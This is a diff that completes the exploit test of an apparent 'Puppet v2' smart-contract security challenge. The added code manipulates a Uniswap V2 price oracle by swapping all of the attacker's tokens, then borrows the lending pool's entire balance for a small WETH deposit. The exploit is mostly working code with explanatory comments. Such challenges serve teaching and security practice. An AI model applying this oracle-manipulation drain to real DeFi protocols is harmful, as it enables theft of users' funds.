@@ -81,7 +81,33 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            Since Uniswap V2 uses the same constant formula for balancing asset prices (different in Uniswap V3 though), the same vulnerability as the orginal 'puppet' 
+            can be used here.
+            Namely, swapping all the attacker's tokens for WETH in Uniswap allows for withdrawing all the lending pool's tokens from an affordable WETH deposit.
+        */
+        this.uniswapRouterAttackerInstance = await this.uniswapRouter.connect(attacker);
+        await (await this.token.connect(attacker)).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE); // Approve Uniswap for token transfer 
+        await this.uniswapRouterAttackerInstance.swapExactTokensForETH( // Get ETH from the pool by swapping DVT tokens
+            ATTACKER_INITIAL_TOKEN_BALANCE, // Contrary to 'puppet', the solution strict > check has been replaced by a >= check allowing to swap the entire attacker's balance
+            0, 
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+        
+        let attackerETHBalance = await ethers.provider.getBalance(attacker.address);
+        let depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        console.log('AttackerBalance:', ethers.utils.formatEther(attackerETHBalance));
+        console.log('DepositRequired:', ethers.utils.formatEther(depositRequired));
+        expect(depositRequired).to.be.lt(attackerETHBalance); // Attacker can afford to withdraw all the lending pool's tokens now
+
+        this.wethAttackerInstance = await this.weth.connect(attacker);
+        await this.wethAttackerInstance.deposit({value: depositRequired}); // Get required amount of WETH using ETH
+        await this.wethAttackerInstance.approve(this.lendingPool.address, depositRequired); // Approve pool for WETH transfer
+        
+        await (await this.lendingPool.connect(attacker)).borrow(POOL_INITIAL_TOKEN_BALANCE); // Empty the pool !
     });
 
     after(async function () {
